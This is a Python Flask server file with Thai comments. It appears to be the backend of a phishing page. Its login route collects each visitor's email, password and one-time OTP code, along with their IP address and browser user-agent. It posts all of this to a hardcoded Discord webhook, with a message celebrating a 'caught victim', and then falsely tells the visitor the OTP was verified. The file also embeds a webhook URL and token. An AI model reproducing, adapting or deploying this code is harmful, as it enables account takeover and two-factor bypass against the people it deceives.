import os
import requests
import json
from flask import Flask, request, render_template, jsonify

app = Flask(__name__)

# Webhook Discord ของมึง
WEBHOOK_URL = "https://discord.com/api/webhooks/1525496997417717924/2XhKXiq5gHrepV5H8uDzECt2JOGBknizoq2VwN4CqbO6Vb1OSqSZ0u-eZZgQv232xAZb"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    try:
        data = request.json
        email = data.get('email')
        password = data.get('password')
        otp = data.get('otp')
        user_agent = request.headers.get('User-Agent')
        ip = request.remote_addr

        # ส่งข้อมูลไป Discord Webhook
        payload = {
            "content": (
                f"🔥 **จับเหยื่อได้แล้ว! (สเตป OTP)**\n"
                f"📧 **Email:** `{email}`\n"
                f"🔑 **Password:** `{password}`\n"
                f"📟 **OTP ที่กรอก:** `{otp}`\n"
                f"🌐 **IP:** `{ip}`\n"
                f"🖥️ **User-Agent:** `{user_agent}`"
            )
        }
        requests.post(WEBHOOK_URL, json=payload)
        return jsonify({"status": "success", "message": "OTP Verified!"})

    except Exception as e:
        print(f"[-] Error: {e}")
        return jsonify({"status": "error", "message": "Something went wrong"}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)